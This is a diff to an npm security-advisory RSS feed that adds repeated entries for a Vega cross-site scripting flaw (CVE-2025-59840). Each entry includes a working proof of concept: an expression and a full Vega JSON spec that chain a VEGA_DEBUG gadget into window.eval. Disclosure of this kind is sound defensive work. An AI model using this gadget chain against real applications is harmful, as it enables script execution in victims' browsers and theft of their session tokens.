@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-11-13T22:18:12.316Z</updated>
+    <updated>2025-11-13T22:36:46.610Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,651 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vega-expression] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable]]></title>
+        <id>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</id>
+        <link href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"/>
+        <updated>2025-11-13T22:32:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" <a href="https://vega.github.io/vega/usage/interpreter/">expressionInterpreter</a> is used. </p>
+<ol>
+<li>Use <code>vega</code> in an application that attaches <code>vega</code> library and a <code>vega.View</code> instance similar to the Vega <a href="https://github.com/vega/editor">Editor</a> to the global <code>window</code></li>
+<li>Allow user-defined Vega <code>JSON</code> definitions (vs JSON that was is only provided through source code)</li>
+</ol>
+<h2 id="patches">Patches</h2>
+<ul>
+<li>If using latest Vega line (6.x)<ul>
+<li><code>vega</code> <code>6.2.0</code> / <code>vega-expression</code> <code>6.1.0</code> / <code>vega-interpreter</code>  <code>2.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+<li>If using Vega in a non-ESM environment<ul>
+<li>( <code>vega-expression</code> <code>5.2.1</code> / <code>1.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading</em></p>
+<ul>
+<li>Do not attach <code>vega</code> View instances to global variables, as Vega editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">here</a></li>
+<li>Do not attach <code>vega</code> to the global window as the editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">here</a></li>
+</ul>
+<p>These practices of attaching the vega library and View instances may be convenient for debugging, but should <em>not</em> be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.</p>
+<h3 id="poc-summary">POC Summary</h3>
+<p>Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling <code>this.foo(this.bar)</code>, DOM XSS can be achieved. </p>
+<p>In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. </p>
+<pre><code class="language-js">({
+    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
+    eventName: event.view.console.log,
+    _handlers: {
+        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
+    },
+    _handlerIndex: event.view.eval
+})+1
+</code></pre>
+<h3 id="poc-details">POC Details</h3>
+<pre><code class="language-json">{
+  "$schema": "https://vega.github.io/schema/vega/v5.json",
+  "width": 350,
+  "height": 350,
+  "autosize": "none",
+  "description": "Toggle Button",
+  "signals": [
+    {
+      "name": "toggle",
+      "value": true,
+      "on": [
+        {
+          "events": {"type": "click", "markname": "circle"},
+          "update": "toggle ? false : true"
+        }
+      ]
+    },
+    {
+      "name": "addFilter",
+      "on": [
+        {
+          "events": {"type": "mousemove", "source": "window"},
+          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
+        }
+
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:</p>
+<pre><code class="language-js">   on(a, o) {
+        const u = this.eventName(a)
+          , d = this._handlers;
+        if (this._handlerIndex(d[u], a, o) &lt; 0) {
+        ....
+        }
+        ....
+   }
+</code></pre>
+<ol>
+<li>Set <code>u</code> to the result of calling <code>this.eventName</code> with undefined <ul>
+<li>For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined</li>
+</ul>
+</li>
+<li>Sets <code>d</code> to <code>this._handlers</code><ul>
+<li>For our object, we have this defined to be used later</li>
+</ul>
+</li>
+<li>Calls <code>this._handlerIndex</code> with the result of <code>u</code> indexed into the <code>d</code> object as the first argument, and undefined as the second two.<ul>
+<li>For our object, <code>_handlerIndex</code> is set to window.eval, and when indexing undefined into the <code>_handlers</code>, a string to be evald containing the XSS payload is returned.</li>
+</ul>
+</li>
+</ol>
+<p>This results in XSS by using a globally scoped gadget to get full blown eval. </p>
+<h3 id="poc-link">PoC Link</h3>
+<p>Navigate <a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">to vega editor</a>, move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.</p>
+<h3 id="future-investigation">Future investigation</h3>
+<p>In cases where <code>VEGA_DEBUG</code> is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to <code>eval</code>, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. <code>$.globalEval</code>). As of this writing, no such globally scoped gadgets have been found. </p>
+<h3 id="impact-1">Impact</h3>
+<p>This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  </p>
+<p>An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59840">https://nvd.nist.gov/vuln/detail/CVE-2025-59840</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16</a></li>
+<li><a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA</a></li>
+<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vega-interpreter] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable]]></title>
+        <id>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</id>
+        <link href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"/>
+        <updated>2025-11-13T22:32:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" <a href="https://vega.github.io/vega/usage/interpreter/">expressionInterpreter</a> is used. </p>
+<ol>
+<li>Use <code>vega</code> in an application that attaches <code>vega</code> library and a <code>vega.View</code> instance similar to the Vega <a href="https://github.com/vega/editor">Editor</a> to the global <code>window</code></li>
+<li>Allow user-defined Vega <code>JSON</code> definitions (vs JSON that was is only provided through source code)</li>
+</ol>
+<h2 id="patches">Patches</h2>
+<ul>
+<li>If using latest Vega line (6.x)<ul>
+<li><code>vega</code> <code>6.2.0</code> / <code>vega-expression</code> <code>6.1.0</code> / <code>vega-interpreter</code>  <code>2.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+<li>If using Vega in a non-ESM environment<ul>
+<li>( <code>vega-expression</code> <code>5.2.1</code> / <code>1.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading</em></p>
+<ul>
+<li>Do not attach <code>vega</code> View instances to global variables, as Vega editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">here</a></li>
+<li>Do not attach <code>vega</code> to the global window as the editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">here</a></li>
+</ul>
+<p>These practices of attaching the vega library and View instances may be convenient for debugging, but should <em>not</em> be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.</p>
+<h3 id="poc-summary">POC Summary</h3>
+<p>Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling <code>this.foo(this.bar)</code>, DOM XSS can be achieved. </p>
+<p>In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. </p>
+<pre><code class="language-js">({
+    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
+    eventName: event.view.console.log,
+    _handlers: {
+        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
+    },
+    _handlerIndex: event.view.eval
+})+1
+</code></pre>
+<h3 id="poc-details">POC Details</h3>
+<pre><code class="language-json">{
+  "$schema": "https://vega.github.io/schema/vega/v5.json",
+  "width": 350,
+  "height": 350,
+  "autosize": "none",
+  "description": "Toggle Button",
+  "signals": [
+    {
+      "name": "toggle",
+      "value": true,
+      "on": [
+        {
+          "events": {"type": "click", "markname": "circle"},
+          "update": "toggle ? false : true"
+        }
+      ]
+    },
+    {
+      "name": "addFilter",
+      "on": [
+        {
+          "events": {"type": "mousemove", "source": "window"},
+          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
+        }
+
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:</p>
+<pre><code class="language-js">   on(a, o) {
+        const u = this.eventName(a)
+          , d = this._handlers;
+        if (this._handlerIndex(d[u], a, o) &lt; 0) {
+        ....
+        }
+        ....
+   }
+</code></pre>
+<ol>
+<li>Set <code>u</code> to the result of calling <code>this.eventName</code> with undefined <ul>
+<li>For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined</li>
+</ul>
+</li>
+<li>Sets <code>d</code> to <code>this._handlers</code><ul>
+<li>For our object, we have this defined to be used later</li>
+</ul>
+</li>
+<li>Calls <code>this._handlerIndex</code> with the result of <code>u</code> indexed into the <code>d</code> object as the first argument, and undefined as the second two.<ul>
+<li>For our object, <code>_handlerIndex</code> is set to window.eval, and when indexing undefined into the <code>_handlers</code>, a string to be evald containing the XSS payload is returned.</li>
+</ul>
+</li>
+</ol>
+<p>This results in XSS by using a globally scoped gadget to get full blown eval. </p>
+<h3 id="poc-link">PoC Link</h3>
+<p>Navigate <a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">to vega editor</a>, move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.</p>
+<h3 id="future-investigation">Future investigation</h3>
+<p>In cases where <code>VEGA_DEBUG</code> is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to <code>eval</code>, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. <code>$.globalEval</code>). As of this writing, no such globally scoped gadgets have been found. </p>
+<h3 id="impact-1">Impact</h3>
+<p>This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  </p>
+<p>An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59840">https://nvd.nist.gov/vuln/detail/CVE-2025-59840</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16</a></li>
+<li><a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA</a></li>
+<li><a href="https://vega.github.io/vega/usage/interpreter">https://vega.github.io/vega/usage/interpreter</a></li>
+<li><a href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-11-13T22:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vega-interpreter] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable]]></title>
+        <id>https://github.com/advisories/GHSA-7f2v-3qq3-vvjf</id>
+        <link href="https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"/>
+        <updated>2025-11-13T22:32:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" <a href="https://vega.github.io/vega/usage/interpreter/">expressionInterpreter</a> is used. </p>
+<ol>
+<li>Use <code>vega</code> in an application that attaches <code>vega</code> library and a <code>vega.View</code> instance similar to the Vega <a href="https://github.com/vega/editor">Editor</a> to the global <code>window</code></li>
+<li>Allow user-defined Vega <code>JSON</code> definitions (vs JSON that was is only provided through source code)</li>
+</ol>
+<h2 id="patches">Patches</h2>
+<ul>
+<li>If using latest Vega line (6.x)<ul>
+<li><code>vega</code> <code>6.2.0</code> / <code>vega-expression</code> <code>6.1.0</code> / <code>vega-interpreter</code>  <code>2.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+<li>If using Vega in a non-ESM environment<ul>
+<li>( <code>vega-expression</code> <code>5.2.1</code> / <code>1.2.1</code> (if using AST evaluator mode)</li>
+</ul>
+</li>
+</ul>
+<h2 id="workarounds">Workarounds</h2>
+<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading</em></p>
+<ul>
+<li>Do not attach <code>vega</code> View instances to global variables, as Vega editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">here</a></li>
+<li>Do not attach <code>vega</code> to the global window as the editor used to do <a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">here</a></li>
+</ul>
+<p>These practices of attaching the vega library and View instances may be convenient for debugging, but should <em>not</em> be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.</p>
+<h3 id="poc-summary">POC Summary</h3>
+<p>Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling <code>this.foo(this.bar)</code>, DOM XSS can be achieved. </p>
+<p>In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. </p>
+<pre><code class="language-js">({
+    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
+    eventName: event.view.console.log,
+    _handlers: {
+        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
+    },
+    _handlerIndex: event.view.eval
+})+1
+</code></pre>
+<h3 id="poc-details">POC Details</h3>
+<pre><code class="language-json">{
+  "$schema": "https://vega.github.io/schema/vega/v5.json",
+  "width": 350,
+  "height": 350,
+  "autosize": "none",
+  "description": "Toggle Button",
+  "signals": [
+    {
+      "name": "toggle",
+      "value": true,
+      "on": [
+        {
+          "events": {"type": "click", "markname": "circle"},
+          "update": "toggle ? false : true"
+        }
+      ]
+    },
+    {
+      "name": "addFilter",
+      "on": [
+        {
+          "events": {"type": "mousemove", "source": "window"},
+          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
+        }
+
+      ]
+    }
+  ]
+}
+</code></pre>
+<p>This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:</p>
+<pre><code class="language-js">   on(a, o) {
+        const u = this.eventName(a)
+          , d = this._handlers;
+        if (this._handlerIndex(d[u], a, o) &lt; 0) {
+        ....
+        }
+        ....
+   }
+</code></pre>
+<ol>
+<li>Set <code>u</code> to the result of calling <code>this.eventName</code> with undefined <ul>
+<li>For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined</li>
+</ul>
+</li>
+<li>Sets <code>d</code> to <code>this._handlers</code><ul>
+<li>For our object, we have this defined to be used later</li>
+</ul>
+</li>
+<li>Calls <code>this._handlerIndex</code> with the result of <code>u</code> indexed into the <code>d</code> object as the first argument, and undefined as the second two.<ul>
+<li>For our object, <code>_handlerIndex</code> is set to window.eval, and when indexing undefined into the <code>_handlers</code>, a string to be evald containing the XSS payload is returned.</li>
+</ul>
+</li>
+</ol>
+<p>This results in XSS by using a globally scoped gadget to get full blown eval. </p>
+<h3 id="poc-link">PoC Link</h3>
+<p>Navigate <a href="https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA">to vega editor</a>, move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.</p>
+<h3 id="future-investigation">Future investigation</h3>
+<p>In cases where <code>VEGA_DEBUG</code> is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to <code>eval</code>, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. <code>$.globalEval</code>). As of this writing, no such globally scoped gadgets have been found. </p>
+<h3 id="impact-1">Impact</h3>
+<p>This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  </p>
+<p>An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf">https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-59840">https://nvd.nist.gov/vuln/detail/CVE-2025-59840</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239</a></li>
+<li><a href="https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16">https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16</a></li>
